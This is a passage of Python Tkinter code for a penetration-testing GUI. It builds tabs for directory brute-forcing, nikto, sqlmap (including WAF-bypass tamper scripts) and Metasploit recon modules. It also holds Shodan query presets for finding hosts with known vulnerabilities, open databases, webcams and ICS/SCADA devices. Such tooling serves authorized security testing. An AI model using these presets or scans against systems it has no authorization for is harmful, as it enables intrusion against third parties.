            text="\n🔎 Directory Brute-Forcer\nFind hidden paths & files\n\nCommon wordlists:\n• /usr/share/wordlists/dirb/\n• /usr/share/seclists/",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("gobuster")
        )
        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def create_nikto_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Target
        self.nikto_target = self.create_labeled_entry(frame, "Target:", 0, "http://example.com")

        # Port
        self.nikto_port = self.create_labeled_entry(frame, "Port:", 1, "80")

        # SSL
        self.nikto_ssl_var = tk.BooleanVar()
        ssl_check = tk.Checkbutton(frame, text="Use SSL (-ssl)", variable=self.nikto_ssl_var,
                                   font=("Courier", 10), fg=self.text_color,
                                   bg=self.bg_secondary, selectcolor=self.bg_primary,
                                   activebackground=self.bg_secondary, activeforeground=self.accent_green)
        ssl_check.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Tuning options
        label = tk.Label(frame, text="Scan Tuning:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)

        self.nikto_tuning = ttk.Combobox(frame, values=[
            "1 (Interesting Files)",
            "2 (Misconfiguration)",
            "3 (Information Disclosure)",
            "4 (Injection)",
            "6 (XSS)",
            "9 (SQL Injection)",
            "x (All Tests)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.nikto_tuning.grid(row=3, column=1, sticky=tk.EW, padx=10, pady=5)
        self.nikto_tuning.current(6)

        # Additional options
        self.nikto_options = self.create_labeled_entry(frame, "Extra Options:", 4, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n🛡️ Web Server Scanner\nVulnerability assessment\n\nScans for:\n• Outdated software\n• Dangerous files\n• Configuration issues",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("nikto")
        )
        cheat_btn.grid(row=6, column=0, columnspan=2, pady=10)

        return frame

    def create_sqlmap_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Warning label
        warning_label = tk.Label(
            frame,
            text="⚠️  SQL INJECTION TESTING  ⚠️\nOnly test systems you have authorization to test",
            font=("Courier", 9, "bold"),
            fg=self.accent_red,
            bg=self.bg_secondary,
            justify=tk.CENTER,
            wraplength=320
        )
        warning_label.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        # Target URL
        self.sqlmap_url = self.create_labeled_entry(frame, "Target URL:", 1, "http://target.com/page.php?id=1")

        # POST Data (optional)
        self.sqlmap_data = self.create_labeled_entry(frame, "POST Data:", 2, "")

        # Cookie (optional)
        self.sqlmap_cookie = self.create_labeled_entry(frame, "Cookie:", 3, "")

        # Level dropdown
        level_label = tk.Label(frame, text="Level (1-5):", font=("Courier", 10),
                              fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        level_label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)

        self.sqlmap_level = ttk.Combobox(frame, values=[
            "1 (Default - Basic tests)",
            "2 (Cookie testing)",
            "3 (User-Agent/Referer)",
            "4 (More payloads)",
            "5 (Maximum - Thorough)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.sqlmap_level.grid(row=4, column=1, sticky=tk.EW, padx=10, pady=5)
        self.sqlmap_level.current(0)

        # Risk dropdown
        risk_label = tk.Label(frame, text="Risk (1-3):", font=("Courier", 10),
                             fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        risk_label.grid(row=5, column=0, sticky=tk.W, padx=10, pady=5)

        self.sqlmap_risk = ttk.Combobox(frame, values=[
            "1 (Safe tests only)",
            "2 (Time-based tests)",
            "3 (OR-based - May modify data!)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.sqlmap_risk.grid(row=5, column=1, sticky=tk.EW, padx=10, pady=5)
        self.sqlmap_risk.current(0)

        # Technique dropdown
        tech_label = tk.Label(frame, text="Technique:", font=("Courier", 10),
                             fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        tech_label.grid(row=6, column=0, sticky=tk.W, padx=10, pady=5)

        self.sqlmap_technique = ttk.Combobox(frame, values=[
            "BEUSTQ (All techniques)",
            "B (Boolean-based blind)",
            "E (Error-based)",
            "U (UNION query-based)",
            "S (Stacked queries)",
            "T (Time-based blind)",
            "Q (Inline queries)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.sqlmap_technique.grid(row=6, column=1, sticky=tk.EW, padx=10, pady=5)
        self.sqlmap_technique.current(0)

        # Threads
        self.sqlmap_threads = self.create_labeled_entry(frame, "Threads (1-10):", 7, "1")

        # Checkboxes frame
        check_frame = tk.Frame(frame, bg=self.bg_secondary)
        check_frame.grid(row=8, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Batch mode (always recommended)
        self.sqlmap_batch_var = tk.BooleanVar(value=True)
        batch_check = tk.Checkbutton(check_frame, text="--batch (No prompts)", variable=self.sqlmap_batch_var,
                                     font=("Courier", 9), fg=self.text_color,
                                     bg=self.bg_secondary, selectcolor=self.bg_primary,
                                     activebackground=self.bg_secondary, activeforeground=self.accent_green)
        batch_check.pack(side=tk.LEFT, padx=5)

        # Forms detection
        self.sqlmap_forms_var = tk.BooleanVar()
        forms_check = tk.Checkbutton(check_frame, text="--forms", variable=self.sqlmap_forms_var,
                                     font=("Courier", 9), fg=self.text_color,
                                     bg=self.bg_secondary, selectcolor=self.bg_primary,
                                     activebackground=self.bg_secondary, activeforeground=self.accent_green)
        forms_check.pack(side=tk.LEFT, padx=5)

        # Random agent
        self.sqlmap_random_agent_var = tk.BooleanVar()
        agent_check = tk.Checkbutton(check_frame, text="--random-agent", variable=self.sqlmap_random_agent_var,
                                     font=("Courier", 9), fg=self.text_color,
                                     bg=self.bg_secondary, selectcolor=self.bg_primary,
                                     activebackground=self.bg_secondary, activeforeground=self.accent_green)
        agent_check.pack(side=tk.LEFT, padx=5)

        # Second row of checkboxes
        check_frame2 = tk.Frame(frame, bg=self.bg_secondary)
        check_frame2.grid(row=9, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Database enumeration
        self.sqlmap_dbs_var = tk.BooleanVar()
        dbs_check = tk.Checkbutton(check_frame2, text="--dbs", variable=self.sqlmap_dbs_var,
                                   font=("Courier", 9), fg=self.text_color,
                                   bg=self.bg_secondary, selectcolor=self.bg_primary,
                                   activebackground=self.bg_secondary, activeforeground=self.accent_green)
        dbs_check.pack(side=tk.LEFT, padx=5)

        # Tables
        self.sqlmap_tables_var = tk.BooleanVar()
        tables_check = tk.Checkbutton(check_frame2, text="--tables", variable=self.sqlmap_tables_var,
                                      font=("Courier", 9), fg=self.text_color,
                                      bg=self.bg_secondary, selectcolor=self.bg_primary,
                                      activebackground=self.bg_secondary, activeforeground=self.accent_green)
        tables_check.pack(side=tk.LEFT, padx=5)

        # Banner
        self.sqlmap_banner_var = tk.BooleanVar()
        banner_check = tk.Checkbutton(check_frame2, text="--banner", variable=self.sqlmap_banner_var,
                                      font=("Courier", 9), fg=self.text_color,
                                      bg=self.bg_secondary, selectcolor=self.bg_primary,
                                      activebackground=self.bg_secondary, activeforeground=self.accent_green)
        banner_check.pack(side=tk.LEFT, padx=5)

        # Tamper script dropdown
        tamper_label = tk.Label(frame, text="Tamper Script:", font=("Courier", 10),
                               fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        tamper_label.grid(row=10, column=0, sticky=tk.W, padx=10, pady=5)

        self.sqlmap_tamper = ttk.Combobox(frame, values=[
            "(None)",
            "space2comment",
            "randomcase",
            "between",
            "charencode",
            "equaltolike",
            "base64encode",
            "space2comment,randomcase"
        ], font=("Courier", 9), state="readonly", width=28)
        self.sqlmap_tamper.grid(row=10, column=1, sticky=tk.EW, padx=10, pady=5)
        self.sqlmap_tamper.current(0)

        # Extra options
        self.sqlmap_options = self.create_labeled_entry(frame, "Extra Options:", 11, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n💉 SQL Injection Scanner\nAutomatic SQLi detection & exploitation\n\nFeatures:\n• Multiple injection techniques\n• Database enumeration\n• WAF bypass capabilities",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=12, column=0, columnspan=2, sticky=tk.W, padx=10, pady=10)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("sqlmap")
        )
        cheat_btn.grid(row=13, column=0, columnspan=2, pady=10)

        return frame

    def create_metasploit_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Warning label
        warning_label = tk.Label(
            frame,
            text="⚠️  RECONNAISSANCE MODULES ONLY  ⚠️\nAuxiliary/Scanner modules for information gathering",
            font=("Courier", 9, "bold"),
            fg=self.accent_red,
            bg=self.bg_secondary,
            justify=tk.CENTER,
            wraplength=320
        )
        warning_label.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        # Module
        label = tk.Label(frame, text="Module:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.msf_module = ttk.Combobox(frame, values=[
            "auxiliary/scanner/portscan/tcp",
            "auxiliary/scanner/portscan/syn",
            "auxiliary/scanner/smb/smb_version",
            "auxiliary/scanner/smb/smb_enumshares",
            "auxiliary/scanner/ssh/ssh_version",
            "auxiliary/scanner/ssh/ssh_enumusers",
            "auxiliary/scanner/http/http_version",
            "auxiliary/scanner/http/http_header",
            "auxiliary/scanner/http/title",
            "auxiliary/scanner/ftp/ftp_version",
            "auxiliary/scanner/ftp/anonymous",
            "auxiliary/scanner/snmp/snmp_enum",
            "auxiliary/scanner/snmp/snmp_enumusers",
            "auxiliary/scanner/dns/dns_amp",
            "auxiliary/scanner/mysql/mysql_version",
            "auxiliary/scanner/postgres/postgres_version"
        ], font=("Courier", 9), state="readonly", width=38)
        self.msf_module.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
        self.msf_module.current(0)

        # Target (RHOSTS)
        self.msf_target = self.create_labeled_entry(frame, "Target (RHOSTS):", 2, "")

        # Ports (for port scanner modules)
        self.msf_ports = self.create_labeled_entry(frame, "Ports:", 3, "1-1000")

        # Threads
        self.msf_threads = self.create_labeled_entry(frame, "Threads:", 4, "10")

        # Additional options
        self.metasploit_options = self.create_labeled_entry(frame, "Extra Options (KEY=VALUE):", 5, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n🔬 Metasploit Framework\nAuxiliary recon & scanning modules\n\nCommon Modules:\n• Port scanners (TCP/SYN)\n• Service version detection\n• SMB/SSH/HTTP enumeration\n\n⚠️ AUTHORIZATION REQUIRED",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("metasploit")
        )
        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def browse_wordlist(self, target_entry=None):
        """Browse for wordlist file and update the specified entry widget."""
        # Get default directory from config or use standard location
        initial_dir = self.config.get("wordlist_path", "/usr/share/wordlists")
        if not os.path.isdir(initial_dir):
            initial_dir = "/usr/share/wordlists" if os.path.isdir("/usr/share/wordlists") else os.path.expanduser("~")

        filename = filedialog.askopenfilename(
            title="Select Wordlist",
            initialdir=initial_dir,
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            # Security: Validate file path to prevent path traversal
            if not self.validate_file_path(filename):
                messagebox.showerror("Error", "Invalid file path selected")
                return

            # Determine which entry to update
            if target_entry:
                target_entry.delete(0, tk.END)
                target_entry.insert(0, filename)
            elif hasattr(self, 'gobuster_wordlist'):
                self.gobuster_wordlist.delete(0, tk.END)
                self.gobuster_wordlist.insert(0, filename)

    def create_shodan_tab(self):
        """Create enhanced Shodan tab with query builder and presets."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Create scrollable frame for all the content
        canvas = tk.Canvas(frame, bg=self.bg_secondary, highlightthickness=0)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.bg_secondary)

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel)

        scrollable_frame.columnconfigure(1, weight=1)
        row = 0

        # ═══════════════════════════════════════════════════════════
        # API KEY STATUS SECTION
        # ═══════════════════════════════════════════════════════════
        api_frame = tk.Frame(scrollable_frame, bg=self.bg_tertiary, padx=10, pady=8)
        api_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        has_api_key = bool(self.config.get("shodan_api_key"))
        api_icon = "✅" if has_api_key else "⚠️"
        api_text = "API Key Configured" if has_api_key else "Configure API key in Settings"
        api_color = self.accent_green if has_api_key else self.accent_orange

        api_status = tk.Label(api_frame, text=f"{api_icon}  {api_text}",
                             font=("Courier", 10, "bold"), fg=api_color, bg=self.bg_tertiary)
        api_status.pack(side=tk.LEFT)
        self.shodan_api_status = api_status

        validate_btn = tk.Button(api_frame, text="🔑 Validate", font=("Courier", 8),
                                bg=self.bg_primary, fg=self.accent_cyan, relief=tk.FLAT,
                                cursor="hand2", command=self.validate_shodan_api_key)
        validate_btn.pack(side=tk.RIGHT, padx=5)
        row += 1

        # ═══════════════════════════════════════════════════════════
        # SEARCH TYPE SECTION
        # ═══════════════════════════════════════════════════════════
        tk.Label(scrollable_frame, text="━━━ SEARCH TYPE ━━━", font=("Courier", 10, "bold"),
                fg=self.accent_cyan, bg=self.bg_secondary).grid(row=row, column=0, columnspan=2,
                sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        self.shodan_type = ttk.Combobox(scrollable_frame, values=[
            "search - General query search",
            "host - IP/hostname lookup",
            "domain - Domain information",
            "dns resolve - DNS resolution",
            "dns reverse - Reverse DNS",
            "exploits - Search exploits DB",
            "count - Count results only",
            "info - API info & credits"
        ], font=("Courier", 9), state="readonly", width=35)
        self.shodan_type.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        self.shodan_type.current(0)
        self.shodan_type.bind("<<ComboboxSelected>>", self.on_shodan_type_change)
        row += 1

        # ═══════════════════════════════════════════════════════════
        # QUICK PRESETS SECTION
        # ═══════════════════════════════════════════════════════════
        tk.Label(scrollable_frame, text="━━━ QUICK PRESETS ━━━", font=("Courier", 10, "bold"),
                fg=self.accent_cyan, bg=self.bg_secondary).grid(row=row, column=0, columnspan=2,
                sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        self.shodan_presets = {
            "🔓 Vulnerable": [
                ("HeartBleed", "vuln:CVE-2014-0160"),
                ("EternalBlue", "vuln:CVE-2017-0144"),
                ("BlueKeep", "vuln:CVE-2019-0708"),
                ("Log4Shell", "vuln:CVE-2021-44228"),
                ("Default Passwords", '"default password"'),
                ("Anonymous FTP", '"230 login successful" port:21'),
            ],
            "🗄️ Databases": [
                ("MongoDB Open", 'product:"MongoDB" port:27017'),
                ("Elasticsearch", "port:9200 elasticsearch"),
                ("MySQL Exposed", 'product:"MySQL"'),
                ("PostgreSQL", "port:5432 PostgreSQL"),
                ("Redis No Auth", "port:6379 -authentication"),
                ("CouchDB", "port:5984 CouchDB"),
                ("Cassandra", "port:9042 cassandra"),
            ],
            "📹 IoT/Cameras": [
                ("All Webcams", "has_screenshot:true webcam"),
                ("Hikvision DVR", 'product:"Hikvision"'),
                ("Dahua Camera", 'product:"Dahua"'),
                ("RTSP Streams", "port:554 has_screenshot:true"),
                ("IP Cameras", '"Network Camera"'),
                ("Smart Home", "port:8123 home-assistant"),
            ],
            "🏭 ICS/SCADA": [
                ("Modbus", "port:502"),
                ("Siemens S7", "port:102 siemens"),
                ("BACnet", "port:47808"),
                ("DNP3", "port:20000"),
                ("EtherNet/IP", "port:44818"),
                ("Niagara Fox", "port:1911 niagara"),
            ],
            "🌐 Web Servers": [
                ("Apache", 'product:"Apache httpd"'),
                ("Nginx", 'product:"nginx"'),
                ("IIS", 'product:"Microsoft IIS"'),
                ("Login Pages", 'http.title:"login"'),
                ("Admin Panels", 'http.title:"admin"'),
                ("WordPress", 'http.component:"WordPress"'),
                ("phpMyAdmin", 'http.title:"phpMyAdmin"'),
            ],
            "🔒 SSL Issues": [
                ("Expired Certs", "ssl.cert.expired:true"),
                ("Self-Signed", "ssl.cert.issuer.cn:ssl.cert.subject.cn"),
                ("Heartbleed", "vuln:CVE-2014-0160"),
            ],
            "🖥️ Remote Access": [
                ("RDP Open", "port:3389"),
                ("VNC No Auth", 'port:5900 "authentication disabled"'),
                ("SSH Servers", 'port:22 "SSH-2.0"'),
                ("Telnet", "port:23 telnet"),
            ],
        }

        preset_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        preset_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        tk.Label(preset_frame, text="Category:", font=("Courier", 9),
                fg=self.text_color, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 5))

        self.shodan_preset_category = ttk.Combobox(preset_frame, values=list(self.shodan_presets.keys()),
                                                   font=("Courier", 9), state="readonly", width=15)
        self.shodan_preset_category.pack(side=tk.LEFT, padx=5)
        self.shodan_preset_category.current(0)
        self.shodan_preset_category.bind("<<ComboboxSelected>>", self.update_shodan_preset_queries)

        self.shodan_preset_query = ttk.Combobox(preset_frame, font=("Courier", 9),
                                                state="readonly", width=18)
        self.shodan_preset_query.pack(side=tk.LEFT, padx=5)
        self.update_shodan_preset_queries()

        apply_btn = tk.Button(preset_frame, text="Apply", font=("Courier", 8, "bold"),
                             bg=self.accent_green, fg=self.bg_primary, relief=tk.FLAT,
                             cursor="hand2", command=self.apply_shodan_preset)
        apply_btn.pack(side=tk.LEFT, padx=5)
        row += 1

        # ═══════════════════════════════════════════════════════════
        # QUERY BUILDER SECTION
        # ═══════════════════════════════════════════════════════════
        tk.Label(scrollable_frame, text="━━━ QUERY BUILDER ━━━", font=("Courier", 10, "bold"),
                fg=self.accent_cyan, bg=self.bg_secondary).grid(row=row, column=0, columnspan=2,
                sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        self.shodan_query = self.create_labeled_entry(scrollable_frame, "Search Query:", row, "")
        row += 1

        # Filter builder
        filter_frame = tk.LabelFrame(scrollable_frame, text="Add Filters", font=("Courier", 9, "bold"),
                                     fg=self.accent_yellow, bg=self.bg_secondary, relief=tk.GROOVE, bd=1)
        filter_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)
        row += 1

        # Location filters
        loc_frame = tk.Frame(filter_frame, bg=self.bg_secondary)
        loc_frame.pack(fill=tk.X, padx=5, pady=3)

        tk.Label(loc_frame, text="🌍 Country:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 2))
        self.shodan_country = ttk.Combobox(loc_frame, values=[
            "", "US", "CN", "RU", "DE", "GB", "FR", "JP", "KR", "IN", "BR", "CA", "AU"
        ], font=("Courier", 8), width=5)
        self.shodan_country.pack(side=tk.LEFT, padx=2)

        tk.Label(loc_frame, text="City:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_city = tk.Entry(loc_frame, font=("Courier", 8), width=12,
                                   bg=self.bg_primary, fg=self.text_color,
                                   insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_city.pack(side=tk.LEFT, padx=2)

        tk.Label(loc_frame, text="Org:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_org = tk.Entry(loc_frame, font=("Courier", 8), width=15,
                                  bg=self.bg_primary, fg=self.text_color,
                                  insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_org.pack(side=tk.LEFT, padx=2)

        # Network filters
        net_frame = tk.Frame(filter_frame, bg=self.bg_secondary)
        net_frame.pack(fill=tk.X, padx=5, pady=3)

        tk.Label(net_frame, text="🔌 Port:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 2))
        self.shodan_port = tk.Entry(net_frame, font=("Courier", 8), width=10,
                                   bg=self.bg_primary, fg=self.text_color,
                                   insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_port.pack(side=tk.LEFT, padx=2)

        tk.Label(net_frame, text="Net (CIDR):", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_net = tk.Entry(net_frame, font=("Courier", 8), width=16,
                                  bg=self.bg_primary, fg=self.text_color,
                                  insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_net.pack(side=tk.LEFT, padx=2)

        tk.Label(net_frame, text="ASN:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_asn = tk.Entry(net_frame, font=("Courier", 8), width=8,
                                  bg=self.bg_primary, fg=self.text_color,
                                  insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_asn.pack(side=tk.LEFT, padx=2)

        # Product filters
        prod_frame = tk.Frame(filter_frame, bg=self.bg_secondary)
        prod_frame.pack(fill=tk.X, padx=5, pady=3)

        tk.Label(prod_frame, text="⚙️ Product:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 2))
        self.shodan_product = ttk.Combobox(prod_frame, values=[
            "", "Apache", "nginx", "IIS", "MySQL", "MongoDB", "Redis", "OpenSSH", "Tomcat"
        ], font=("Courier", 8), width=10)
        self.shodan_product.pack(side=tk.LEFT, padx=2)

        tk.Label(prod_frame, text="OS:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_os = ttk.Combobox(prod_frame, values=[
            "", "Linux", "Windows", "Ubuntu", "Debian", "CentOS", "FreeBSD"
        ], font=("Courier", 8), width=10)
        self.shodan_os.pack(side=tk.LEFT, padx=2)

        tk.Label(prod_frame, text="Version:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_version = tk.Entry(prod_frame, font=("Courier", 8), width=8,
                                       bg=self.bg_primary, fg=self.text_color,
                                       insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_version.pack(side=tk.LEFT, padx=2)

        # HTTP filters
        http_frame = tk.Frame(filter_frame, bg=self.bg_secondary)
        http_frame.pack(fill=tk.X, padx=5, pady=3)

        tk.Label(http_frame, text="🌐 Title:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 2))
        self.shodan_title = tk.Entry(http_frame, font=("Courier", 8), width=15,
                                    bg=self.bg_primary, fg=self.text_color,
                                    insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_title.pack(side=tk.LEFT, padx=2)

        tk.Label(http_frame, text="HTML:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(10, 2))
        self.shodan_html = tk.Entry(http_frame, font=("Courier", 8), width=12,
                                   bg=self.bg_primary, fg=self.text_color,
                                   insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_html.pack(side=tk.LEFT, padx=2)

        self.shodan_screenshot_var = tk.BooleanVar()
        tk.Checkbutton(http_frame, text="Screenshot", variable=self.shodan_screenshot_var,
                      font=("Courier", 8), fg=self.text_color, bg=self.bg_secondary,
                      selectcolor=self.bg_primary, activebackground=self.bg_secondary).pack(side=tk.LEFT, padx=10)

        # Vulnerability filters
        vuln_frame = tk.Frame(filter_frame, bg=self.bg_secondary)
        vuln_frame.pack(fill=tk.X, padx=5, pady=3)

        tk.Label(vuln_frame, text="⚠️ CVE:", font=("Courier", 8),
                fg=self.text_muted, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 2))
        self.shodan_cve = tk.Entry(vuln_frame, font=("Courier", 8), width=18,
                                  bg=self.bg_primary, fg=self.text_color,
                                  insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.shodan_cve.pack(side=tk.LEFT, padx=2)

        # Build query button
        btn_row = tk.Frame(filter_frame, bg=self.bg_secondary)
        btn_row.pack(fill=tk.X, padx=5, pady=8)

        tk.Button(btn_row, text="🔧 BUILD QUERY", font=("Courier", 9, "bold"),
                 bg=self.accent_purple, fg=self.text_color, relief=tk.FLAT, cursor="hand2",
                 padx=15, command=self.build_shodan_query).pack(side=tk.LEFT, padx=5)

        tk.Button(btn_row, text="🗑️ Clear", font=("Courier", 8), bg=self.bg_tertiary,
                 fg=self.text_color, relief=tk.FLAT, cursor="hand2",
                 command=self.clear_shodan_filters).pack(side=tk.LEFT, padx=5)

        # ═══════════════════════════════════════════════════════════
        # OUTPUT OPTIONS SECTION
        # ═══════════════════════════════════════════════════════════
        tk.Label(scrollable_frame, text="━━━ OUTPUT OPTIONS ━━━", font=("Courier", 10, "bold"),
                fg=self.accent_cyan, bg=self.bg_secondary).grid(row=row, column=0, columnspan=2,
                sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        output_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        output_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
        row += 1

        tk.Label(output_frame, text="Limit:", font=("Courier", 9),
                fg=self.text_color, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(0, 5))
        self.shodan_limit = ttk.Combobox(output_frame, values=["10", "25", "50", "100", "250", "500"],
                                        font=("Courier", 9), width=6)
        self.shodan_limit.pack(side=tk.LEFT, padx=5)
        self.shodan_limit.set("100")

        tk.Label(output_frame, text="Facets:", font=("Courier", 9),
                fg=self.text_color, bg=self.bg_secondary).pack(side=tk.LEFT, padx=(15, 5))
        self.shodan_facets = ttk.Combobox(output_frame, values=[
            "country,org", "country,port", "org,port", "product,version", "os,port", "vuln", ""
        ], font=("Courier", 9), width=15)
        self.shodan_facets.pack(side=tk.LEFT, padx=5)
        self.shodan_facets.set("country,org")

        self.shodan_options = self.create_labeled_entry(scrollable_frame, "Extra Options:", row, "")
        row += 1

        # ═══════════════════════════════════════════════════════════
        # QUICK SEARCHES SECTION
        # ═══════════════════════════════════════════════════════════
        tk.Label(scrollable_frame, text="━━━ ONE-CLICK SEARCHES ━━━", font=("Courier", 10, "bold"),
                fg=self.accent_cyan, bg=self.bg_secondary).grid(row=row, column=0, columnspan=2,
                sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        quick_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        quick_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
        row += 1

        quick_searches = [
            ("🔓 Open RDP", 'port:3389 "Remote Desktop"'),
            ("🗄️ MongoDB", 'product:"MongoDB" port:27017'),
            ("📹 Webcams", "has_screenshot:true"),
            ("🔑 Defaults", '"default password"'),
            ("🏭 SCADA", "port:502 modbus"),
        ]

        for name, query in quick_searches:
            tk.Button(quick_frame, text=name, font=("Courier", 8), bg=self.bg_tertiary,
                     fg=self.accent_cyan, relief=tk.FLAT, cursor="hand2", padx=6, pady=2,
                     command=lambda q=query: self.set_shodan_query(q)).pack(side=tk.LEFT, padx=2)

        # ═══════════════════════════════════════════════════════════
